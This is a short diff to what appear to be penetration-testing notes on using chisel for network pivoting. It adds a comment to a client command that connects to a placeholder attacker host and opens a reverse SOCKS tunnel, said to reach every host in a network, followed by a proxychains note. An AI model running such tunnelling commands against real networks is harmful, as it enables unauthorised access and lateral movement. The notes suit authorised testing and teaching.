@@ -9,7 +9,7 @@ chisel server -p 1337 --reverse
 Chisel Client:
 ---------------
 
-chisel client attackerip:port R:socks
+chisel client attackerip:port R:socks #This will help us to tunnel every host in a network.
 
 Note: Now edit your proxychains4.conf file with following details.
 
